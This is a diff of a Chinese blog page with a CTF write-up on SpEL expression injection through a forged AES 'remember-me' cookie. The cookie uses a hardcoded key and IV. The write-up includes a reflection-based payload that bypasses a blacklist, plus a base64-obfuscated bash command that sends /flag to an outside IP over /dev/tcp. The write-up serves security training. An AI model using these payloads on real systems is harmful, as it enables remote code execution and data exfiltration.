 <li><strong>知识点</strong>：代码审计、表达式注入、黑名单过滤绕过、CVE-2016-4437</li>
 </ul>
 <p>地址：58.240.236.228:33014</p>
@@ -522,20 +536,24 @@
 </ul>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&#123;&quot;/login&quot;&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(<span class="meta">@RequestParam(value = &quot;username&quot;,required = true)</span> String username, <span class="meta">@RequestParam(value = &quot;password&quot;,required = true)</span> String password, <span class="meta">@RequestParam(value = &quot;remember-me&quot;,required = false)</span> String isRemember, HttpSession session, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.userConfig.getUsername().contentEquals(username) &amp;&amp; <span class="keyword">this</span>.userConfig.getPassword().contentEquals(password)) &#123;</span><br><span class="line">        session.setAttribute(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">        <span class="keyword">if</span> (isRemember != <span class="keyword">null</span> &amp;&amp; !isRemember.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            Cookie c = <span class="keyword">new</span> Cookie(<span class="string">&quot;remember-me&quot;</span>, <span class="keyword">this</span>.userConfig.encryptRememberMe());</span><br><span class="line">            c.setMaxAge(<span class="number">2592000</span>);</span><br><span class="line">            response.addCookie(c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/login-error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ul>
-<li><p>接受三个参数，其中username和password均为admin（写在application.yml里面）</p>
+<li>
+<p>接受三个参数，其中username和password均为admin（写在application.yml里面）</p>
 </li>
-<li><p>remember-me为可选参数，当不为空时，调用加密函方法，并设置为Cookie值，加密方法如下</p>
+<li>
+<p>remember-me为可选参数，当不为空时，调用加密函方法，并设置为Cookie值，加密方法如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UserConfig</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">encryptRememberMe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String encryptd = Encryptor.encrypt(<span class="keyword">this</span>.rememberMeKey, <span class="string">&quot;0123456789abcdef&quot;</span>, <span class="keyword">this</span>.username);</span><br><span class="line">    <span class="keyword">return</span> encryptd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Encryptor</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(String key, String initVector, String value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        IvParameterSpec iv = <span class="keyword">new</span> IvParameterSpec(initVector.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        SecretKeySpec skeySpec = <span class="keyword">new</span> SecretKeySpec(key.getBytes(<span class="string">&quot;UTF-8&quot;</span>), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5PADDING&quot;</span>);</span><br><span class="line">        cipher.init(<span class="number">1</span>, skeySpec, iv);</span><br><span class="line">        <span class="keyword">byte</span>[] encrypted = cipher.doFinal(value.getBytes());</span><br><span class="line">        <span class="keyword">return</span> Base64.getUrlEncoder().encodeToString(encrypted);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        logger.warn(var7.getMessage());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ul>
 <li>容易看出用了aes加密，其中初始向量<code>iv=0123456789abcdef</code>，密钥<code>rememberMeKey=c0dehack1nghere1</code>（同样写在application.yml里</li>
 </ul>
 </li>
-<li><p>以上是登录的流程的分析，若登录成功，则会跳转到根页面hello，以下是关键代码分析</p>
+<li>
+<p>以上是登录的流程的分析，若登录成功，则会跳转到根页面hello，以下是关键代码分析</p>
 </li>
 </ul>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(<span class="meta">@CookieValue(value = &quot;remember-me&quot;,required = false)</span> String rememberMeValue, HttpSession session, Model model)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rememberMeValue != <span class="keyword">null</span> &amp;&amp; !rememberMeValue.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        String username = <span class="keyword">this</span>.userConfig.decryptRememberMe(rememberMeValue);</span><br><span class="line">        <span class="keyword">if</span> (username != <span class="keyword">null</span>) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object username = session.getAttribute(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (username != <span class="keyword">null</span> &amp;&amp; !username.toString().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;name&quot;</span>, <span class="keyword">this</span>.getAdvanceValue(username.toString()));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/login&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ul>
-<li>接受一个可选参数remember-me，若非空，则调用解密函数，将解密结果赋值给username，持久化后返回hello页面，在hello页面返回前还执行了<code>model.addAttribute(&quot;name&quot;, this.getAdvanceValue(username.toString()));</code>，这个方法大概作用就是：<ul>
+<li>接受一个可选参数remember-me，若非空，则调用解密函数，将解密结果赋值给username，持久化后返回hello页面，在hello页面返回前还执行了<code>model.addAttribute(&quot;name&quot;, this.getAdvanceValue(username.toString()));</code>，这个方法大概作用就是：
+<ul>
 <li>将username进行黑名单过滤，黑名单就一个Runtime.getRuntime().exec()</li>
 <li>解析SpEL表达式</li>
 <li>解析结果返回hello页面</li>
@@ -551,18 +569,18 @@
 </ul>
 <p>我们的目的就是让表达式解析我们的恶意payload而造成rce</p>
 <p>先测试一下我们的思路对不对，首先用源码的加密方式加密字符串<code>2*2</code>，然后把密文当作cookie的remember-me发送</p>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image13.png" alt="image"></p>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image13.png" alt="image" /></p>
 <p>结果我惊了，好消息是加密方式没错，确实能将username设置为我们想要的内容，坏消息是他压根没被解析出来，按理来说应该得是4才对，经过调试后发现，在<code>ParserContext parserContext = new TemplateParserContext();</code>定义了表达式的模板（或者说是格式），其中<code>TemplateParserContext</code>类规定了表达式的形式是<code>#&#123;Expression Language&#125;</code>的形式，这就好办了，我们把<code>#&#123;2*2&#125;</code>加密一下重新尝试</p>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image14.png" alt="image"></p>
-<p>居然还是不行….但是我自己写了个类又是没问题的，后来重新看代码的时候才发现，，后端设值语句为<code>model.addAttribute(&quot;name&quot;, this.getAdvanceValue(username.toString()));</code>，而前端取值语句为<code>&lt;h2 th:text=&quot;&#39;Hello, &#39; + $&#123;session.username&#125;&quot;&gt;&lt;/h2&gt;</code>，完全不对应，，，等于说后端其实是执行了的，只是没有把执行结果返回前端而已（一时竟不知这是出题人失误还是故意的）</p>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image14.png" alt="image" /></p>
+<p>居然还是不行…但是我自己写了个类又是没问题的，后来重新看代码的时候才发现，，后端设值语句为<code>model.addAttribute(&quot;name&quot;, this.getAdvanceValue(username.toString()));</code>，而前端取值语句为<code>&lt;h2 th:text=&quot;'Hello, ' + $&#123;session.username&#125;&quot;&gt;&lt;/h2&gt;</code>，完全不对应，，，等于说后端其实是执行了的，只是没有把执行结果返回前端而已（一时竟不知这是出题人失误还是故意的）</p>
 <p>现在只剩下最后过个黑名单了，这个也十分简单，用反射+字符串拆分就行，编写payload如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String value = <span class="string">&quot;#&#123;T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;).getMethod(&#x27;ex&#x27;+&#x27;ec&#x27;, T(String[])).invoke(T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;).getMethod(&#x27;getRun&#x27;+&#x27;time&#x27;).invoke(T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;)), new String[]&#123;&#x27;calc.exe&#x27;&#125;)&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
 <p>对payload进行加密后，本地起项目尝试发送，成功弹窗，说明已经完成rce，最后就是读取flag了</p>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image15.png" alt="image"></p>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image15.png" alt="image" /></p>
 <p>最后将执行的命令改为读取flag并带出，payload如下</p>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image16.png" alt="image"></p>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image16.png" alt="image" /></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String value = <span class="string">&quot;#&#123;T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;).getMethod(&#x27;ex&#x27;+&#x27;ec&#x27;, T(String[])).invoke(T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;).getMethod(&#x27;getRun&#x27;+&#x27;time&#x27;).invoke(T(String).getClass().forName(&#x27;java.la&#x27;+&#x27;ng.Ru&#x27;+&#x27;ntime&#x27;)), new String[]&#123;&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;&#123;echo,Y2F0IC9mbGFnID4mIC9kZXYvdGNwLzEuMTQuMTY5LjEwOS85MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&#125;)&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image17.png" alt="image"></p>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image17.png" alt="image" /></p>
 <p>监听端口，成功获取flag</p>
 <p>最后想了一下，这道题虽然没用shiro但是还是叫这个名的意思大概是因为在spel表达式注入之前的漏洞利用的是shiro的CVE-2016-4437？就也是因为AES硬编码、使用默认密钥导致的，通过cookie的rememberMe参数注入的漏洞</p>
 
